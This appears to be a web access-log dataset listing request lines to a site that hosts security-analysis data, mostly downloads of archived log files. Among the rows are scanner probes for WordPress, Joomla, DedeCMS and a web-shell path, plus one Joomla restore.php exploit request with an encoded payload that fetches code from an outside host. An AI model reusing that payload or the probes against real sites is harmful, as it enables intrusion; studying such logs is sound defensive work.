220,1,200,0,GET /?nsukey=6i8eWeLEitp55aigrCwsv2Ogl3s2B6NxXvFWX40lyPjfTAmEeXOFx8BCVF2FbCsftIffSR5cOcf6dnusBSL5C1tcq41qSpT16LAm6BA5Z3SuSd3bVA2FSAbNXe6t09VafYt2FKSLWn2FTp83dVZ2BzrYmBlnJGFn7ZmJKFidD6PxCLtMKPX9LByCcSNRgYxUJsvHkf HTTP/1.1,1060
47,1,200,0,GET /self.logs/error.log.2015-01-26.gz HTTP/1.1,1061
48,1,200,0,GET /self.logs/access.log.2015-06-24.gz HTTP/1.1,1062
48,1,200,0,GET /self.logs/access.log.2015-10-13.gz HTTP/1.1,1063
48,1,200,0,GET /self.logs/access.log.2015-06-04.gz HTTP/1.1,1064
48,1,200,0,GET /self.logs/access.log.2017-01-08.gz HTTP/1.1,1065
47,1,200,0,GET /self.logs/error.log.2015-12-12.gz HTTP/1.1,1066
47,1,200,0,GET /self.logs/error.log.2016-10-28.gz HTTP/1.1,1067
48,1,200,0,GET /self.logs/access.log.2015-10-07.gz HTTP/1.1,1068
61,1,404,0,GET //wp-content/upgrade/theme-compat/popup-pomo.php HTTP/1.0,1069
48,1,200,0,GET /self.logs/access.log.2016-10-05.gz HTTP/1.1,1070
47,1,200,0,GET /self.logs/error.log.2017-01-10.gz HTTP/1.1,1071
48,1,200,0,GET /self.logs/access.log.2015-08-24.gz HTTP/1.1,1072
38,1,404,0,GET /access.log.2015-03-24.gz HTTP/1.1,1073
48,1,200,0,GET /self.logs/access.log.2016-09-18.gz HTTP/1.1,1074
47,1,200,0,GET /self.logs/error.log.2015-05-17.gz HTTP/1.1,1075
47,1,301,0,GET /self.logs/error.log.2016-01-08.gz HTTP/1.1,1076
25,1,404,0,GET /sitemap.xml HTTP/1.1,1077
48,1,200,0,GET /self.logs/access.log.2016-02-27.gz HTTP/1.1,1078
32,1,200,0,GET /pe_static/zeus.zip HTTP/1.1,1079
47,1,200,0,GET /self.logs/error.log.2015-07-03.gz HTTP/1.1,1080
219,1,200,0,GET /?nsukey=MtYDbs26NUV2FYQBfb8AAJ54eWcasaP89twBDILnjDBculyH6p2FH6xnhHhVFHOtObCbcrlvhuMwofD32oIUvbQtffh99MqRM2FX2G9BJrKHoj2BR0BiE7v9y3wcusfoWtMswYPFnGgl8i7vng8CSFHhI25WKdZxL8wOm0hpgDeGZ8Obbhxja2FLMDf5JkX48L3IL HTTP/1.1,1081
48,1,200,0,GET /self.logs/access.log.2015-05-25.gz HTTP/1.1,1082
47,1,200,0,GET /self.logs/error.log.2016-07-02.gz HTTP/1.1,1083
24,1,418,0,GET /xmlrpc.php HTTP/1.1,1084
54,1,404,0,GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1,1085
46,1,404,0,GET /apple-touch-icon-precomposed.png HTTP/1.1,1086
47,1,200,0,GET /self.logs/error.log.2016-04-24.gz HTTP/1.1,1087
38,1,404,0,GET /access.log.2015-03-16.gz HTTP/1.1,1088
48,1,200,0,GET /self.logs/access.log.2016-10-22.gz HTTP/1.1,1089
47,1,200,0,GET /self.logs/error.log.2016-10-10.gz HTTP/1.1,1090
47,1,200,0,GET /self.logs/error.log.2015-07-28.gz HTTP/1.1,1091
47,1,200,0,GET /self.logs/error.log.2015-09-02.gz HTTP/1.1,1092
48,1,200,0,GET /self.logs/access.log.2015-05-21.gz HTTP/1.1,1093
52,1,404,0,GET /apple-touch-icon-76x76-precomposed.png HTTP/1.1,1094
47,1,200,0,GET /self.logs/error.log.2016-10-09.gz HTTP/1.1,1095
38,1,404,0,GET /access.log.2015-03-10.gz HTTP/1.1,1096
48,1,200,0,GET /self.logs/access.log.2016-09-17.gz HTTP/1.1,1097
47,1,200,0,GET /self.logs/error.log.2015-07-23.gz HTTP/1.1,1098
56,1,200,0,HEAD /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.0,1099
47,1,200,0,GET /self.logs/error.log.2015-07-07.gz HTTP/1.1,1100
47,1,200,0,GET /self.logs/error.log.2016-06-09.gz HTTP/1.1,1101
48,1,200,0,GET /self.logs/access.log.2016-07-21.gz HTTP/1.1,1102
47,1,200,0,GET /self.logs/error.log.2015-06-03.gz HTTP/1.1,1103
47,1,200,0,GET /self.logs/error.log.2015-11-16.gz HTTP/1.1,1104
51,1,404,0,GET /member/templets/images/login_logo.gif HTTP/1.1,1105
24,1,200,0,GET /#3p_passwd HTTP/1.1,1106
48,1,200,0,GET /self.logs/access.log.2015-03-24.gz HTTP/1.1,1107
48,1,200,0,GET /self.logs/access.log.2017-01-28.gz HTTP/1.1,1108
38,1,404,0,GET /access.log.2015-01-23.gz HTTP/1.1,1109
47,1,200,0,GET /self.logs/error.log.2015-04-18.gz HTTP/1.1,1110
47,1,200,0,GET /self.logs/error.log.2016-04-29.gz HTTP/1.1,1111
48,1,200,0,GET /self.logs/access.log.2015-03-25.gz HTTP/1.1,1112
48,1,200,0,GET /self.logs/access.log.2016-11-06.gz HTTP/1.1,1113
51,1,404,1,GET /honeypot/Honeypot%2520-%2520Howto.pdf HTTP/1.1,1114
47,1,200,0,GET /self.logs/error.log.2017-01-20.gz HTTP/1.1,1115
48,1,200,0,GET /self.logs/access.log.2015-01-21.gz HTTP/1.1,1116
48,1,200,0,GET /self.logs/access.log.2016-01-20.gz HTTP/1.1,1117
59,1,404,1,GET /honeypot//%22https://twitter.com/theroxyd/%22 HTTP/1.0,1118
59,1,404,1,GET /honeypot//%22https://twitter.com/theroxyd/%22 HTTP/1.1,1119
47,1,200,0,GET /self.logs/error.log.2015-04-02.gz HTTP/1.1,1120
47,1,200,0,GET /self.logs/error.log.2016-07-21.gz HTTP/1.1,1121
29,1,404,0,GET //popup-pomo.php HTTP/1.0,1122
33,1,200,0,GET /tg/tg_snort_full.7z HTTP/1.1,1123
33,1,200,0,GET /tg/tg_snort_full.7z HTTP/1.0,1124
38,1,404,0,GET /access.log.2015-02-10.gz HTTP/1.1,1125
48,1,200,0,GET /self.logs/access.log.2015-01-23.gz HTTP/1.1,1126
47,1,200,0,GET /self.logs/error.log.2016-10-27.gz HTTP/1.1,1127
55,1,200,0,GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1,1128
47,1,200,0,GET /self.logs/error.log.2015-08-22.gz HTTP/1.1,1129
48,1,200,0,GET /self.logs/access.log.2016-08-13.gz HTTP/1.1,1130
38,1,200,0,GET /maccdc2012/tunnel.log.gz HTTP/1.1,1131
22,1,404,0,GET /atom.xml HTTP/1.1,1132
48,1,200,0,GET /self.logs/access.log.2017-01-25.gz HTTP/1.1,1133
48,1,200,0,GET /self.logs/access.log.2015-03-10.gz HTTP/1.1,1134
22,1,200,0,GET /tg/c.zip HTTP/1.1,1135
47,1,200,0,GET /self.logs/error.log.2015-05-02.gz HTTP/1.1,1136
47,1,200,0,GET /self.logs/error.log.2016-03-12.gz HTTP/1.1,1137
31,1,301,0,GET /self.logs?C=M;O=A HTTP/1.1,1138
38,1,404,0,GET /access.log.2015-02-03.gz HTTP/1.1,1139
47,1,200,0,GET /self.logs/error.log.2016-06-20.gz HTTP/1.1,1140
47,1,200,0,GET /self.logs/error.log.2016-02-16.gz HTTP/1.1,1141
36,1,200,0,GET /maccdc2012/smtp.log.gz HTTP/1.1,1142
48,1,200,0,GET /self.logs/access.log.2015-05-03.gz HTTP/1.1,1143
48,1,200,0,GET /self.logs/access.log.2016-09-05.gz HTTP/1.1,1144
47,1,200,0,GET /self.logs/error.log.2015-09-26.gz HTTP/1.1,1145
48,1,200,0,GET /self.logs/access.log.2016-07-25.gz HTTP/1.1,1146
34,1,200,0,GET /scada/scada_logs.zip HTTP/1.1,1147
47,1,200,0,GET /self.logs/error.log.2015-08-03.gz HTTP/1.1,1148
23,1,404,0,GET /blog/feed HTTP/1.1,1149
38,1,404,0,GET /access.log.2015-02-08.gz HTTP/1.1,1150
47,1,200,0,GET /self.logs/error.log.2016-12-01.gz HTTP/1.1,1151
48,1,200,0,GET /self.logs/access.log.2015-07-12.gz HTTP/1.1,1152
48,1,200,0,GET /self.logs/access.log.2016-10-26.gz HTTP/1.1,1153
48,1,200,0,GET /self.logs/access.log.2015-02-10.gz HTTP/1.1,1154
48,1,200,0,GET /self.logs/access.log.2015-12-31.gz HTTP/1.1,1155
48,1,200,0,GET /self.logs/access.log.2016-12-31.gz HTTP/1.1,1156
37,1,200,0,GET /Security-Data-Analysis/ HTTP/1.1,1157
48,1,200,0,GET /self.logs/access.log.2016-07-28.gz HTTP/1.1,1158
34,1,404,0,GET /apple-touch-icon.png HTTP/1.1,1159
47,1,200,0,GET /self.logs/error.log.2016-07-12.gz HTTP/1.1,1160
38,1,404,0,GET /access.log.2015-03-18.gz HTTP/1.1,1161
38,1,404,0,GET /access.log.2015-03-09.gz HTTP/1.1,1162
25,1,404,0,GET /maccdc2012$ HTTP/1.1,1163
48,1,200,0,GET /self.logs/access.log.2015-02-03.gz HTTP/1.1,1164
47,1,200,0,GET /self.logs/error.log.2016-08-07.gz HTTP/1.1,1165
28,1,404,0,GET /xmlrpc.php?rsd HTTP/1.1,1166
47,1,200,0,GET /self.logs/error.log.2015-10-13.gz HTTP/1.1,1167
47,1,200,0,GET /self.logs/error.log.2015-05-01.gz HTTP/1.1,1168
48,1,200,0,GET /self.logs/access.log.2016-06-19.gz HTTP/1.1,1169
47,1,200,0,GET /self.logs/error.log.2016-08-24.gz HTTP/1.1,1170
47,1,200,0,GET /self.logs/error.log.2016-07-01.gz HTTP/1.1,1171
47,1,200,0,GET /self.logs/error.log.2015-08-12.gz HTTP/1.1,1172
48,1,200,0,GET /self.logs/access.log.2015-02-08.gz HTTP/1.1,1173
47,1,200,0,GET /self.logs/error.log.2016-04-03.gz HTTP/1.1,1174
48,1,200,0,GET /self.logs/access.log.2015-12-09.gz HTTP/1.1,1175
23,1,404,0,GET /index.xml HTTP/1.1,1176
47,1,200,0,GET /self.logs/error.log.2015-10-25.gz HTTP/1.1,1177
48,1,200,0,GET /self.logs/access.log.2016-01-14.gz HTTP/1.1,1178
48,1,200,0,GET /self.logs/access.log.2016-04-16.gz HTTP/1.1,1179
47,1,200,0,GET /self.logs/error.log.2015-03-27.gz HTTP/1.1,1180
48,1,200,0,GET /self.logs/access.log.2015-10-12.gz HTTP/1.1,1181
47,1,200,0,GET /self.logs/error.log.2015-03-15.gz HTTP/1.1,1182
47,1,200,0,GET /self.logs/error.log.2016-02-12.gz HTTP/1.1,1183
47,1,200,0,GET /self.logs/error.log.2016-06-04.gz HTTP/1.1,1184
54,1,404,0,GET /bootstrap/img/apple-touch-icon-72x72.png HTTP/1.1,1185
48,1,200,0,GET /self.logs/access.log.2015-03-09.gz HTTP/1.1,1186
48,1,200,0,GET /self.logs/access.log.2016-04-22.gz HTTP/1.1,1187
29,1,404,0,GET /maccdc2012/wget HTTP/1.1,1188
54,1,404,0,GET /dede/templets/article_coonepage_rule.htm HTTP/1.1,1189
48,1,200,0,GET /self.logs/access.log.2015-12-10.gz HTTP/1.1,1190
48,1,200,0,GET /self.logs/access.log.2015-03-18.gz HTTP/1.1,1191
48,1,200,0,GET /self.logs/access.log.2015-02-11.gz HTTP/1.1,1192
343,2,404,0,GET /self.logs/administrator/components/com_joomlaupdate/restore.php?task=stepRestore&factory=Tzo5OiJBS0ZhY3RvcnkiOjE6e3M6MTg6IgBBS0ZhY3RvcnkAdmFybGlzdCI7YToyOntzOjI3OiJraWNrc3RhcnQuc2VjdXJpdHkucGFzc3dvcmQiO3M6MDoiIjtzOjI2OiJraWNrc3RhcnQuc2V0dXAuc291cmNlZmlsZSI7czo0NDoiaHR0cDovL2VjZWxsLm5pdHJrbC5hYy5pbi9pcGl6cG0vd3Q1Mjg5bi56aXAiO319 HTTP/1.1,1193
47,1,200,0,GET /self.logs/error.log.2016-01-01.gz HTTP/1.1,1194
48,1,200,0,GET /self.logs/access.log.2015-02-23.gz HTTP/1.1,1195
48,1,200,0,GET /self.logs/access.log.2016-05-10.gz HTTP/1.1,1196
48,1,200,0,GET /self.logs/access.log.2016-07-29.gz HTTP/1.1,1197
48,1,200,0,GET /self.logs/access.log.2015-12-14.gz HTTP/1.1,1198
48,1,200,0,GET /self.logs/access.log.2015-07-01.gz HTTP/1.1,1199
48,1,200,0,GET /self.logs/access.log.2015-10-19.gz HTTP/1.1,1200
47,1,200,0,GET /self.logs/error.log.2016-03-24.gz HTTP/1.1,1201
47,1,200,0,GET /self.logs/error.log.2016-01-30.gz HTTP/1.1,1202
47,1,200,0,GET /self.logs/error.log.2016-03-04.gz HTTP/1.1,1203
48,1,200,0,GET /self.logs/access.log.2015-11-02.gz HTTP/1.1,1204
48,1,200,0,GET /self.logs/access.log.2016-03-12.gz HTTP/1.1,1205
47,1,200,0,GET /self.logs/error.log.2016-04-13.gz HTTP/1.1,1206
32,1,200,0,GET /self.logs/?C=M;O=A HTTP/1.1,1207
32,1,200,0,GET /self.logs/?C=M;O=A HTTP/1.0,1208
47,1,301,0,GET /self.logs/error.log.2015-12-09.gz HTTP/1.1,1209
48,1,200,0,GET /self.logs/access.log.2016-01-06.gz HTTP/1.1,1210
47,1,301,0,GET /self.logs/error.log.2015-11-20.gz HTTP/1.1,1211
48,1,200,0,GET /self.logs/access.log.2016-05-22.gz HTTP/1.1,1212
47,1,200,0,GET /self.logs/error.log.2015-11-08.gz HTTP/1.1,1213
48,1,200,0,GET /self.logs/access.log.2015-04-27.gz HTTP/1.1,1214
48,1,200,0,GET /self.logs/access.log.2016-02-07.gz HTTP/1.1,1215
47,1,200,0,GET /self.logs/error.log.2016-05-03.gz HTTP/1.1,1216
48,1,200,0,GET /self.logs/access.log.2016-01-03.gz HTTP/1.1,1217
58,1,404,1,GET /honeypot//%22https://twitter.com/sooshie/%22 HTTP/1.0,1218
58,1,404,1,GET /honeypot//%22https://twitter.com/sooshie/%22 HTTP/1.1,1219
48,1,200,0,GET /self.logs/access.log.2016-12-09.gz HTTP/1.1,1220
48,1,200,0,GET /self.logs/access.log.2016-02-13.gz HTTP/1.1,1221
47,1,200,0,GET /self.logs/error.log.2016-01-21.gz HTTP/1.1,1222
47,1,200,0,GET /self.logs/error.log.2015-10-20.gz HTTP/1.1,1223
48,1,200,0,GET /self.logs/access.log.2016-03-31.gz HTTP/1.1,1224
53,1,404,1,GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1,1225
48,1,200,0,GET /self.logs/access.log.2015-07-26.gz HTTP/1.1,1226
47,1,200,0,GET /self.logs/error.log.2016-10-12.gz HTTP/1.1,1227
47,1,200,0,GET /self.logs/error.log.2016-02-22.gz HTTP/1.1,1228
48,1,200,0,GET /self.logs/access.log.2016-02-18.gz HTTP/1.1,1229
38,1,404,0,GET /access.log.2015-03-21.gz HTTP/1.1,1230
24,1,200,0,GET /#3p_threat HTTP/1.1,1231
48,1,200,0,GET /self.logs/access.log.2015-09-22.gz HTTP/1.1,1232
48,1,200,0,GET /self.logs/access.log.2016-04-21.gz HTTP/1.1,1233
48,1,200,0,GET /self.logs/access.log.2015-10-03.gz HTTP/1.1,1234
47,1,200,0,GET /self.logs/error.log.2015-09-03.gz HTTP/1.1,1235
47,1,200,0,GET /self.logs/error.log.2015-07-08.gz HTTP/1.1,1236
47,1,200,0,GET /self.logs/error.log.2016-08-03.gz HTTP/1.1,1237
45,1,418,1,GET /honeypot/BSidesDFW - 2014.ipynb HTTP/1.1,1238
48,1,200,0,GET /self.logs/access.log.2016-07-23.gz HTTP/1.1,1239
20,1,200,0,GET /#about HTTP/1.1,1240
48,1,200,0,GET /self.logs/access.log.2015-06-02.gz HTTP/1.1,1241
42,1,404,0,GET /wp/wp-admin/setup-config.php HTTP/1.1,1242
47,1,200,0,GET /self.logs/error.log.2016-01-09.gz HTTP/1.1,1243
22,1,200,0,GET /#3p_file HTTP/1.1,1244
48,1,200,0,GET /self.logs/access.log.2015-07-16.gz HTTP/1.1,1245
47,1,200,0,GET /self.logs/error.log.2015-04-21.gz HTTP/1.1,1246
48,1,200,0,GET /self.logs/access.log.2015-10-27.gz HTTP/1.1,1247
48,1,200,0,GET /self.logs/access.log.2016-11-23.gz HTTP/1.1,1248
47,1,200,0,GET /self.logs/error.log.2015-07-21.gz HTTP/1.1,1249
48,1,200,0,GET /self.logs/access.log.2016-09-20.gz HTTP/1.1,1250
48,1,200,0,GET /self.logs/access.log.2015-06-25.gz HTTP/1.1,1251
47,1,200,0,GET /self.logs/error.log.2015-09-09.gz HTTP/1.1,1252
48,1,200,0,GET /self.logs/access.log.2016-07-16.gz HTTP/1.1,1253
47,1,200,0,GET /self.logs/error.log.2016-06-12.gz HTTP/1.1,1254
47,1,200,0,GET /self.logs/error.log.2015-06-06.gz HTTP/1.1,1255
47,1,200,0,GET /self.logs/error.log.2015-07-10.gz HTTP/1.1,1256
47,1,200,0,GET /self.logs/error.log.2015-04-22.gz HTTP/1.1,1257
22,1,200,0,GET /#network HTTP/1.1,1258
47,1,200,0,GET /self.logs/error.log.2015-12-07.gz HTTP/1.1,1259
48,1,200,0,GET /self.logs/access.log.2016-11-16.gz HTTP/1.1,1260
48,1,200,0,GET /self.logs/access.log.2015-03-21.gz HTTP/1.1,1261
47,1,200,0,GET /self.logs/error.log.2016-10-02.gz HTTP/1.1,1262
48,1,200,0,GET /self.logs/access.log.2016-04-07.gz HTTP/1.1,1263
48,1,200,0,GET /self.logs/access.log.2015-10-21.gz HTTP/1.1,1264
47,1,200,0,GET /self.logs/error.log.2016-09-16.gz HTTP/1.1,1265
47,1,200,0,GET /self.logs/error.log.2016-07-20.gz HTTP/1.1,1266
26,1,404,0,GET /wp-login.php HTTP/1.0,1267
26,1,404,0,GET /wp-login.php HTTP/1.1,1268
48,1,200,0,GET /self.logs/access.log.2015-05-11.gz HTTP/1.1,1269
47,1,200,0,GET /self.logs/error.log.2017-01-17.gz HTTP/1.1,1270
22,1,301,0,GET /manager/ HTTP/1.1,1271
48,1,200,0,GET /self.logs/access.log.2016-12-15.gz HTTP/1.1,1272
48,1,200,0,GET /self.logs/access.log.2016-11-07.gz HTTP/1.1,1273
48,1,200,0,GET /self.logs/access.log.2015-11-25.gz HTTP/1.1,1274
36,1,404,0,GET /member/images/base.css HTTP/1.1,1275
47,1,200,0,GET /self.logs/error.log.2015-01-28.gz HTTP/1.1,1276
47,1,200,0,GET /self.logs/error.log.2016-01-07.gz HTTP/1.1,1277
47,1,200,0,GET /self.logs/error.log.2015-07-25.gz HTTP/1.1,1278
47,1,200,0,GET /self.logs/error.log.2015-05-30.gz HTTP/1.1,1279
47,1,200,0,GET /self.logs/error.log.2016-12-14.gz HTTP/1.1,1280
47,1,200,0,GET /self.logs/error.log.2015-12-10.gz HTTP/1.1,1281
48,1,200,0,GET /self.logs/access.log.2016-12-10.gz HTTP/1.1,1282
47,1,200,0,GET /self.logs/error.log.2015-02-21.gz HTTP/1.1,1283
47,1,200,0,GET /self.logs/error.log.2015-09-07.gz HTTP/1.1,1284
48,1,200,0,GET /self.logs/access.log.2015-05-20.gz HTTP/1.1,1285
38,1,404,0,GET /access.log.2015-03-23.gz HTTP/1.1,1286
28,1,301,0,GET /administrator/ HTTP/1.1,1287
48,1,200,0,GET /self.logs/access.log.2015-11-30.gz HTTP/1.1,1288
47,1,200,0,GET /self.logs/error.log.2016-01-13.gz HTTP/1.1,1289
47,1,200,0,GET /self.logs/error.log.2015-07-06.gz HTTP/1.1,1290
47,1,200,0,GET /self.logs/error.log.2016-10-11.gz HTTP/1.1,1291
48,1,200,0,GET /self.logs/access.log.2016-08-04.gz HTTP/1.1,1292
48,1,200,0,GET /self.logs/access.log.2016-07-18.gz HTTP/1.1,1293
47,1,200,0,GET /self.logs/error.log.2016-08-11.gz HTTP/1.1,1294
47,1,200,0,GET /self.logs/error.log.2016-01-15.gz HTTP/1.1,1295
47,1,200,0,GET /self.logs/error.log.2015-02-23.gz HTTP/1.1,1296
38,1,404,0,GET /access.log.2015-01-31.gz HTTP/1.1,1297
48,1,200,0,GET /self.logs/access.log.2016-06-04.gz HTTP/1.1,1298
48,1,200,0,GET /self.logs/access.log.2016-01-23.gz HTTP/1.1,1299
47,1,200,0,GET /self.logs/error.log.2016-05-16.gz HTTP/1.1,1300
48,1,200,0,GET /self.logs/access.log.2017-01-12.gz HTTP/1.1,1301
47,1,200,0,GET /self.logs/error.log.2015-04-10.gz HTTP/1.1,1302
24,1,200,0,GET /self.logs/ HTTP/1.1,1303
24,1,200,0,GET /self.logs/ HTTP/1.0,1304
48,1,200,0,GET /self.logs/access.log.2016-01-04.gz HTTP/1.1,1305
47,1,200,0,GET /self.logs/error.log.2016-08-02.gz HTTP/1.1,1306
48,1,200,0,GET /self.logs/access.log.2016-11-03.gz HTTP/1.1,1307
47,1,200,0,GET /self.logs/error.log.2016-09-05.gz HTTP/1.1,1308
43,1,200,0,GET /Security-Data-Analysis/Lab_1/ HTTP/1.1,1309
42,1,404,0,GET /apple-touch-icon-120x120.png HTTP/1.1,1310
47,1,200,0,GET /self.logs/error.log.2016-07-24.gz HTTP/1.1,1311
48,1,200,0,GET /self.logs/access.log.2015-05-04.gz HTTP/1.1,1312
48,1,200,0,GET /self.logs/access.log.2015-11-08.gz HTTP/1.1,1313
47,1,200,0,GET /self.logs/error.log.2017-01-06.gz HTTP/1.1,1314
48,1,200,0,GET /self.logs/access.log.2016-11-27.gz HTTP/1.1,1315
47,1,200,0,GET /self.logs/error.log.2015-06-10.gz HTTP/1.1,1316
48,1,200,0,GET /self.logs/access.log.2016-09-24.gz HTTP/1.1,1317
223,1,200,0,GET /?nsukey=N9rkTszqr2F1tL9xXJtucbm02FuT9udcM79cxMqBXX9NEp46Xr0fokcc96z24thuLvOT2BBB2B2BOlYRUZ4A1qYP79NpCb6ivw1kJrc2Fmfg4aXRsGrTRxAM3FaQ2FJ92PLSup4uQ6tMUvHOyZXChd5iBdLpzzFV0Y2BJrWUsjWPYc2BrS6BnqD3KLr6rJQGrB0KX2Pjw HTTP/1.1,1318
48,1,200,0,GET /self.logs/access.log.2016-01-28.gz HTTP/1.1,1319
48,1,200,0,GET /self.logs/access.log.2016-01-31.gz HTTP/1.1,1320
47,1,200,0,GET /self.logs/error.log.2015-02-22.gz HTTP/1.1,1321
48,1,200,0,GET /self.logs/access.log.2016-09-22.gz HTTP/1.1,1322
47,1,200,0,GET /self.logs/error.log.2016-06-25.gz HTTP/1.1,1323
47,1,200,0,GET /self.logs/error.log.2015-10-12.gz HTTP/1.1,1324
47,1,301,0,GET /self.logs/error.log.2015-12-04.gz HTTP/1.1,1325
48,1,200,0,GET /self.logs/access.log.2015-06-18.gz HTTP/1.1,1326
38,1,404,0,GET /access.log.2015-02-22.gz HTTP/1.1,1327
47,1,200,0,GET /self.logs/error.log.2015-10-06.gz HTTP/1.1,1328
48,1,200,0,GET /self.logs/access.log.2015-06-12.gz HTTP/1.1,1329
48,1,200,0,GET /self.logs/access.log.2015-09-04.gz HTTP/1.1,1330
38,1,404,0,GET /access.log.2015-04-10.gz HTTP/1.1,1331
47,1,200,0,GET /self.logs/error.log.2015-03-22.gz HTTP/1.1,1332
40,1,404,0,GET /member/images/dzh_logo.gif HTTP/1.1,1333
48,1,200,0,GET /self.logs/access.log.2016-04-10.gz HTTP/1.1,1334
48,1,200,0,GET /self.logs/access.log.2016-09-06.gz HTTP/1.1,1335
47,1,200,0,GET /self.logs/error.log.2015-05-24.gz HTTP/1.1,1336
38,1,404,0,GET /access.log.2015-04-05.gz HTTP/1.1,1337
48,1,200,0,GET /self.logs/access.log.2016-05-05.gz HTTP/1.1,1338
47,1,200,0,GET /self.logs/error.log.2015-10-18.gz HTTP/1.1,1339
47,1,200,0,GET /self.logs/error.log.2016-06-13.gz HTTP/1.1,1340
48,1,200,0,GET /self.logs/access.log.2016-02-29.gz HTTP/1.1,1341
47,1,200,0,GET /self.logs/error.log.2015-08-05.gz HTTP/1.1,1342
47,1,200,0,GET /self.logs/error.log.2015-05-26.gz HTTP/1.1,1343
48,1,200,0,GET /self.logs/access.log.2016-03-23.gz HTTP/1.1,1344
48,1,200,0,GET /self.logs/access.log.2015-10-11.gz HTTP/1.1,1345
69,1,200,1,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1,1346
69,1,200,1,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.0,1347
48,1,200,0,GET /self.logs/access.log.2015-04-10.gz HTTP/1.1,1348
48,1,200,0,GET /self.logs/access.log.2016-11-13.gz HTTP/1.1,1349
47,1,200,0,GET /self.logs/error.log.2015-08-13.gz HTTP/1.1,1350
48,1,200,0,GET /self.logs/access.log.2016-11-19.gz HTTP/1.1,1351
23,1,200,0,HEAD /tg/c.zip HTTP/1.0,1352
48,1,200,0,GET /self.logs/access.log.2016-12-17.gz HTTP/1.1,1353
47,1,200,0,GET /self.logs/error.log.2015-07-15.gz HTTP/1.1,1354
48,1,200,0,GET /self.logs/access.log.2015-02-22.gz HTTP/1.1,1355
47,1,200,0,GET /self.logs/error.log.2016-09-24.gz HTTP/1.1,1356
40,1,200,0,GET //bootstrap/img/favicon.ico HTTP/1.1,1357
35,1,404,0,GET /touch-icon-iphone.png HTTP/1.1,1358
47,1,200,0,GET /self.logs/error.log.2016-06-28.gz HTTP/1.1,1359
32,1,404,0,GET /data/admin/ver.txt HTTP/1.1,1360
48,1,200,0,GET /self.logs/access.log.2016-08-10.gz HTTP/1.1,1361
47,1,200,0,GET /self.logs/error.log.2015-11-26.gz HTTP/1.1,1362
38,1,404,0,GET /access.log.2015-03-27.gz HTTP/1.1,1363
38,1,404,0,GET /access.log.2015-02-26.gz HTTP/1.1,1364
48,1,200,0,GET /self.logs/access.log.2015-11-14.gz HTTP/1.1,1365
47,1,200,0,GET /self.logs/error.log.2016-04-26.gz HTTP/1.1,1366
47,1,200,0,GET /self.logs/error.log.2015-10-16.gz HTTP/1.1,1367
47,1,200,0,GET /self.logs/error.log.2016-05-01.gz HTTP/1.1,1368
34,1,200,0,GET /scada/scada_logs.zip HTTP/1.0,1369
48,1,200,0,GET /self.logs/access.log.2016-03-01.gz HTTP/1.1,1370
47,1,200,0,GET /self.logs/error.log.2016-05-21.gz HTTP/1.1,1371
48,1,200,0,GET /self.logs/access.log.2016-03-18.gz HTTP/1.1,1372
48,1,200,0,GET /self.logs/access.log.2015-04-05.gz HTTP/1.1,1373
48,1,200,0,GET /self.logs/access.log.2015-02-28.gz HTTP/1.1,1374
48,1,200,0,GET /self.logs/access.log.2017-01-20.gz HTTP/1.1,1375
48,1,200,0,GET /self.logs/access.log.2016-12-04.gz HTTP/1.1,1376
48,1,200,0,GET /self.logs/access.log.2015-04-25.gz HTTP/1.1,1377
47,1,200,0,GET /self.logs/error.log.2016-10-18.gz HTTP/1.1,1378
47,1,200,0,GET /self.logs/error.log.2015-05-27.gz HTTP/1.1,1379
37,1,200,0,GET /maccdc2012/files.log.gz HTTP/1.1,1380
37,1,200,0,GET /maccdc2012/files.log.gz HTTP/1.0,1381
48,1,200,0,GET /self.logs/access.log.2015-09-01.gz HTTP/1.1,1382
47,1,200,0,GET /self.logs/error.log.2016-04-25.gz HTTP/1.1,1383
35,1,200,0,HEAD /scada/scada_logs.zip HTTP/1.0,1384
47,1,200,0,GET /self.logs/error.log.2016-11-18.gz HTTP/1.1,1385
49,1,404,1,GET /honeypot/bsidesdfw%20-%202014.ipynb HTTP/1.1,1386
47,1,200,0,GET /self.logs/error.log.2015-03-01.gz HTTP/1.1,1387
31,1,301,0,GET /self.logs?C=D;O=A HTTP/1.1,1388
48,1,200,0,GET /self.logs/access.log.2015-06-11.gz HTTP/1.1,1389
47,1,200,0,GET /self.logs/error.log.2015-01-31.gz HTTP/1.1,1390
